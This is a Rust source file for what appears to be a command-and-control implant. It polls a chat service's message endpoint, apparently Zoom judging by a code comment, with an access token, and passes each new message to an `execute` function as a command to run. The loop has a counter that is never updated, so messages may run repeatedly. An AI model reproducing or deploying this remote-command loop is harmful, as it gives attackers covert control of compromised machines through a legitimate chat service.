use reqwest;
use reqwest::Error;
use serde_json::{Value};
use serde;
use crate::operation::{execute};
use std::{thread, time::Duration};


use crate::Estruct::{Message, Root};


pub async fn httpGetRequest(host: &str, access_token:&str) -> Result<(),Error> {
    //loop to list message , if dound any new then do operation on top of it
    let client = reqwest::Client::new();
    let mut count_message = 0;
    loop {
        //let body = reqwest::get(host).header("abcd:def").await?;
        let response = client.get(host).header(String::from("Authorization"),access_token).send().await?;
        //println!("status is {}",response.status());
        //
        let body = &response.text().await?;
        //println!("{}",body);
        let root:Root = serde_json::from_str(&body).unwrap();
        let mut command: Vec<Message> = root.messages;
        if command.len()==count_message {
            thread::sleep(Duration::from_secs(5));
            continue;
        }
        else {
            println!("[+]New Message found");
            let new_msg = command.pop();
            match new_msg{
                Some(msg) => {
                    if msg.message.starts_with("access_token") {

                    }
                    else {
                        let resp : String = execute(&msg.message);
                        thread::sleep(Duration::from_secs(1));
                    }
                }
                None => {
                    continue;
                }
            }
            /*for msg in &command{
                if msg.message.starts_with("access_token") {

                }
                else {
                    let new_msg = command.pop().unwrap();
                    let resp : String = execute(&msg.message);
                    thread::sleep(Duration::from_secs(1));
                    println!("final response is {}",resp);

                }
                count_message+=1;  
                break;
                   
            }
            */
        }
        //since the ate limit for zoom API call is 2 per second, we are calling sleep function for 4 s
        thread::sleep(Duration::from_secs(5));
        
    
    }
    Ok(())
} 